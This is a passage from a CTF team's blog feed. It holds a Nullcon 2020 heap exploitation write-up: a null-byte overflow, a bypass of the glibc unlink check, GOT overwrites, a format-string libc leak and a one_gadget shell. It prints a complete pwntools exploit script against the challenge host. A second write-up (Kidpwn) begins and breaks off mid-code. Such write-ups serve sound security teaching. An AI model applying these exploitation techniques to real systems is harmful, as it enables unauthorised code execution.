block according to the specified index.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">freeBook_40093A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to return?"</span>);</span><br><span class="line">  v1 = getInt_4007ED();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"boy, you cannot return what you dont have!"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  result = v1;</span><br><span class="line">  ptr[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Edit a book:</strong> Read data into the allocated memory according to the specified index and there is a null byte overflow situation here.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">edit_4008EC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = getInt_4007ED();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Writing in the air now?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Name of the book?"</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int64)editString_400830((<span class="keyword">char</span> *)ptr[v2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The usual print function is not available.</p><h3 id="Basic-plan"><a href="#Basic-plan" class="headerlink" title="Basic plan"></a>Basic plan</h3><p>Since the program itself has no print function, in order to get libc, our primary purpose is to construct a leak first. The basic idea is as follows:</p><ul><li>Use unlink to modify <strong>ptr[0]</strong> to <strong>&amp;ptr[0]-0x18</strong></li><li>Use editing function to <strong>edit(0)</strong> and overflow ptr[1] to <strong>exit@got</strong> and ptr[2] to <strong>atoi@got</strong></li><li>Use <strong>edit(2)</strong> to modify <strong>atoi@got</strong> to <strong>printf</strong></li><li>Use format-string to leak a libc addr from the stack</li><li>Use <strong>edit(1)</strong> to modify <strong>exit@got</strong> to <strong>one_gadget</strong></li></ul><h3 id="Off-by-one-null-byte-poisoning"><a href="#Off-by-one-null-byte-poisoning" class="headerlink" title="Off by one (null byte poisoning)"></a>Off by one (null byte poisoning)</h3><p>Now the idea with the null byte overflow is to set the <strong>prev_in_use</strong> bit of <strong>chunk B</strong> to zero, this bit is used to determine if the previous chunk is freed, if we free chunk B the <strong>free</strong> function is going to try to unlink <strong>chunk A</strong>, because it thinks its <strong>freed</strong> and present in <strong>doubly linked list</strong>, what defines the <strong>prev</strong> and <strong>next</strong> items in the list are the <strong>bk</strong> and <strong>fd</strong> pointers.</p><h3 id="Understanding-unlink"><a href="#Understanding-unlink" class="headerlink" title="Understanding unlink"></a>Understanding unlink</h3><p>To understand well the unlink macro we need to understand its operations, the source code of unlink:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                   </span><br><span class="line">    BK = P-&gt;bk;                                   </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             </span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                    </span><br><span class="line">        FD-&gt;bk = BK; <span class="comment">// arbitrary write happens here                                  </span></span><br><span class="line">        BK-&gt;fd = FD; <span class="comment">// arbitrary write happens here                                  </span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;            </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,                      </span><br><span class="line">                   <span class="string">"corrupted double-linked list (not small)"</span>,    </span><br><span class="line">                   P, AV);                        </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                    </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             </span><br><span class="line">                <span class="keyword">else</span> &#123;                                </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 </span><br><span class="line">                  &#125;                               </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             </span><br><span class="line">              &#125;                                   </span><br><span class="line">          &#125;                                   </span><br><span class="line">      &#125;                                       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The operations of <strong>FD-&gt;bk = BK</strong> and <strong>BK-&gt;fd = FD</strong> is what we want to achieve.</p><p>Now taking a simple example, imagine we have 3 chunks. </p><p>Starting with <strong>FD = P-&gt;fd</strong> and <strong>BK = P-&gt;bk</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/vy0TnDr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vy0TnDr.png" alt><br></a></p><p>We execute the <strong>FD-&gt;bk=BK</strong> operation:<br><a data-fancybox="gallery" href="https://i.imgur.com/ezrH4lt.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ezrH4lt.png" alt><br></a><br>And finally the <strong>BK-&gt;fd=FD</strong> operation:<br><a data-fancybox="gallery" href="https://i.imgur.com/2bgPH4V.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/2bgPH4V.png" alt><br></a><br>But there is a security check to bypass:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure><p>We can’t directly use this to modify for example a <strong>GOT</strong> entry but we can bypass this mechanism in a fake way.</p><p>First, we overwrite the FD pointer of nextchunk to fakeFD and the BK pointer of nextchunk to fakeBK, so in order to pass the verification we need:</p><ul><li><code>fakeFD-&gt;bk == P</code> &lt;=&gt; <code>*(fakeFD+0x18) == P</code></li><li><code>fakeBK-&gt;fd == p</code> &lt;=&gt; <code>*(fakeBK+0x10) == P</code></li></ul><p>When the two above restrictions are satisfied, you can enter unlink and perform the following operations:</p><ul><li><code>fakeFD-&gt;bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 0x18) = fakeBK</code></li><li><code>fakeBK-&gt;fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 0x10) = fakeFD</code></li></ul><p>Since this <strong>fakeFD-&gt;bk</strong> and <strong>fakeBK-&gt;fd</strong> must contain the address of <strong>P</strong> we need to find a place where the address of <strong>P</strong> is located and this place is at <strong>ptr</strong> list. </p><p>If we can <strong>change</strong> one of the pointers stored in the <strong>ptr</strong> list to a <strong>pointer</strong> located in the <strong>bss</strong> segment, we will be able to <strong>edit</strong> the entire list, after that, we just change the values in that list to write <strong>wherever</strong> we want.</p><h3 id="Creating-the-exploit"><a href="#Creating-the-exploit" class="headerlink" title="Creating the exploit"></a>Creating the exploit</h3><p>First we create a chunk A and a chunk B, inside of chunk A we create a fake chunk with size of 0xf1 set chunk B prev_size equal to 0xf0.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(fakefd)+p64(fakebk)+<span class="string">'B'</span>*<span class="number">0xd0</span> +p64(<span class="number">0xf0</span>)) <span class="comment"># create a fake chunk and overwrite prev_in_use</span></span><br></pre></td></tr></table></figure><p>Before the null byte overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/LjRHQvx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LjRHQvx.png" alt><br></a><br>After the null byte overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/moHRqfu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/moHRqfu.png" alt><br></a><br>The prev_size value is to bypass this security check:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ( __builtin_expect  ( chunksize ( P )  ! =  prev_size  ( next_chunk ( P )),  <span class="number">0</span> ))       </span><br><span class="line">   malloc_printerr  ( <span class="string">"corrupted size vs. prev_size"</span> );</span><br></pre></td></tr></table></figure></p><p>We can check the first security check of <code>FD-&gt;bk != P || BK-&gt;fd != P</code> by doing this in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/OZO3SnC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OZO3SnC.png" alt><br></a><br>Lets trigger <strong>unlink</strong> by freeing chunk B:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>The content of <strong>global ptr</strong> will look like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/lI0RmbD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lI0RmbD.png" alt><br></a><br>Now we add got pointers to the list:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x0</span>)*<span class="number">3</span> + p64(<span class="number">0x602188</span>) + p64(elf.got[<span class="string">'exit'</span>]) + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0x602188</span>))</span><br></pre></td></tr></table></figure><p>Overwriting <strong>atoi@got</strong> at index 2 with <strong>printf</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br></pre></td></tr></table></figure><p>Now that <strong>atoi@got</strong> points to <strong>printf</strong> it no longer converts the input string to integers but we can still use <strong>printf</strong> to select the menu options because the return value of <strong>printf</strong> is the number of bytes printed:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(<span class="string">' '</span>) <span class="comment"># 2 bytes sent so the option selected is 2 which is free</span></span><br><span class="line">r.sendline(<span class="string">'%lx'</span>) <span class="comment"># leak libc with format string</span></span><br><span class="line">r.recvuntil(<span class="string">'Which book do you want to return?\n'</span>)</span><br><span class="line">LEAK = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = LEAK <span class="number">-0x3c4963</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>%LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC_BASE 0x%x'</span>%LIBC)</span><br></pre></td></tr></table></figure><p>Finally we edit <strong>exit@got</strong> with onegadget and we get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'5) Checkout!\n'</span>,<span class="string">' '</span>*<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>) <span class="comment"># send 1 byte to select edit option</span></span><br><span class="line">r.sendafter(<span class="string">'Name of the book?\n'</span>, p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment">#overwrite exit@got</span></span><br><span class="line">r.sendline(<span class="string">'loool'</span>) <span class="comment"># trigger exit aka one_gadget</span></span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn2.ctf.nullcon.net"</span>, <span class="string">"5002"</span></span><br><span class="line">filename = <span class="string">"./challenge"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">GLOBAL = <span class="number">0x6020A0</span></span><br><span class="line">ptr = <span class="number">0x6021A0</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'Name of the book?\n'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Which book do you want to return?\n'</span>, str(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Name of the book?\n'</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#r.interactive()</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'finally! a customer, what is your name?\n'</span>, <span class="string">'A'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#add('C'*8)</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x400877</span>]) <span class="comment"># 0x400977,0x4008EC</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(fakefd)+p64(fakebk)+<span class="string">'B'</span>*<span class="number">0xd0</span> +p64(<span class="number">0xf0</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#add('B'*8)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x0</span>)*<span class="number">3</span> + p64(<span class="number">0x602188</span>) + p64(elf.got[<span class="string">'exit'</span>]) + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0x602188</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br><span class="line">r.sendline(<span class="string">' '</span>)</span><br><span class="line">r.sendline(<span class="string">'%lx'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Which book do you want to return?\n'</span>)</span><br><span class="line">LEAK = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = LEAK <span class="number">-0x3c4963</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>%LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC_BASE 0x%x'</span>%LIBC)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'5) Checkout!\n'</span>,<span class="string">' '</span>*<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">'Name of the book?\n'</span>, p64(LIBC+<span class="number">0x4526a</span>))</span><br><span class="line">r.sendline(<span class="string">'loool'</span>)</span><br><span class="line"><span class="comment">#r.sendlineafter('5) Checkout!\n', '3')</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"><span class="comment">#add('C'*8)</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;437 Points   &lt;/p&gt;
&lt;p&gt;nc pwn2.ctf.nullcon.net 5002&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mega.nz/#!rjZEHaS
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
      <category term="Unlink" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unlink/"/>
    
    
      <category term="unlink" scheme="https://teamrocketist.github.io/tags/unlink/"/>
    
      <category term="offbyone" scheme="https://teamrocketist.github.io/tags/offbyone/"/>
    
      <category term="nullcon2020" scheme="https://teamrocketist.github.io/tags/nullcon2020/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Nullcon 2020 - Kidpwn</title>
    <link href="https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-Kidpwn/"/>
    <id>https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-Kidpwn/</id>
    <published>2020-02-09T10:28:39.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>437 Points   </p><p>nc pwn2.ctf.nullcon.net 5003</p><p><a href="https://mega.nz/#!mqYEhSBb!gl9DC7pgcI0dF7-n2yR667i4ve7VcI3RBox06-Shrhw" target="_blank" rel="noopener">challenge</a></p><p>f115365f85409565c4bdf94690434aae</p><p><a href="https://mega.nz/#!6jRgRA6C!C67-WeX3J5Z174wxwnQ8llhYjSnjL5N6lPTUFCVMYh8" target="_blank" rel="noopener">libc-2.23.so</a></p><p>8c0d248ea33e6ef17b759fa5d81dda9e</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak <strong>libc</strong> and <strong>pie</strong> addresses with format string</li><li>Overflow the <strong>last byte</strong> of ret addr and jump to another position in <strong>_libc_main</strong> to return to main</li><li>Change <strong>exit got</strong> with <strong>one gadget</strong> using format string</li></ul><h3 id="Binary-security-and-architecture"><a href="#Binary-security-and-architecture" class="headerlink" title="Binary security and architecture"></a>Binary security and architecture</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec challenge</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/kidpwn/challenge'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>No canary protection</strong> in this executable, relro is partial meaning we can <strong>overwrite</strong> the global offset table also we have another issue <strong>PIE</strong> is enabled. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file challenge</span><br><span class="line">challenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=286d2ceaa8091a1b44bb0dcaf214d76c1d40bfee, stripped</span><br></pre></td></tr></table></figure><p>Libc is a shared library (dynamically linked) and the architecture is x86-64.</p><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><p>Analysing the <strong>main</strong> we know we have a very simple program, it reads an integer from the input and creates a buffer in the stack using <strong>alloca</strong>, then it reads input from the stdin and stores it in this new created buffer then it prints it using <strong>printf</strong>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v7; <span class="comment">// [rsp+6Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( unk_20105C )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">200</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    v7 = atoi(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = alloca(<span class="number">16</span> * (((__int16)v7 + <span class="number">30L</span>L) / <span class="number">0x10</span>uLL));</span><br><span class="line">  qword_201060 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  read(<span class="number">0</span>, (<span class="keyword">void</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>)), v7);</span><br><span class="line">  <span class="built_in">printf</span>(qword_201060);</span><br><span 